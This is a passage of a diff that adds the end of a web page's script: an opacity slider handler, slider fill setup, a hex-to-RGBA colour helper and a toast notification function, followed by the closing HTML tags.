+opacitySlider.addEventListener('input', () => {
+  opacity = +opacitySlider.value / 100;
+  opacityVal.textContent = opacitySlider.value + '%';
+  const pct = ((+opacitySlider.value - 5) / 95 * 100).toFixed(1);
+  opacitySlider.style.setProperty('--pct2', pct + '%');
+});
+
+/* init slider fills */
+sizeSlider.style.setProperty('--pct', '11.9%');
+opacitySlider.style.setProperty('--pct2', '89.5%');
+
+/* ═══════════════════════════════════════════
+   UTILS
+═══════════════════════════════════════════ */
+function hexToRgba(hex, a) {
+  const r = parseInt(hex.slice(1,3), 16);
+  const g = parseInt(hex.slice(3,5), 16);
+  const b = parseInt(hex.slice(5,7), 16);
+  return `rgba(${r},${g},${b},${a})`;
+}
+
+let toastTimer;
+function toast(msg, type='') {
+  const el = document.getElementById('toast');
+  el.textContent = msg;
+  el.className = type ? `show ${type}` : 'show';
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => el.classList.remove('show'), 2800);
+}
+</script>
+</body>
+</html>
